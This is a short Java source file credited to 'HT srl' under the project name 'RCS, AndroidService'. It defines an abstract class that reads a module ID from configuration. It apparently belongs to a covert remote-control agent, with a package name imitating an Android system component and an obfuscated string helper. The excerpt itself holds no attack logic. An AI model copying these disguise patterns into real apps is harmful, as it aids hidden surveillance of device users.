/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StopAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.action;

import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfAction;
import com.android.syssetup.conf.ConfigurationException;
import com.android.syssetup.util.Check;
import com.android.mm.M;

// TODO: Auto-generated Javadoc
/**
 * The Class StopAgentAction.
 */
abstract class ModuleAction extends SubAction {
	private static final String TAG = "AgentAction"; //$NON-NLS-1$

	protected String moduleId;
	protected static final java.lang.String moduleStr = M.e("module");

	/**
	 * Instantiates a new stop agent action.
	 * 
	 * @param jsubaction
	 *            the conf params
	 */
	public ModuleAction(final ConfAction jsubaction) {
		super(jsubaction);
	}

	@Override
	protected boolean parse(ConfAction params) {

		try {
			this.moduleId = params.getString(moduleStr);
		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		return true;
	}

}
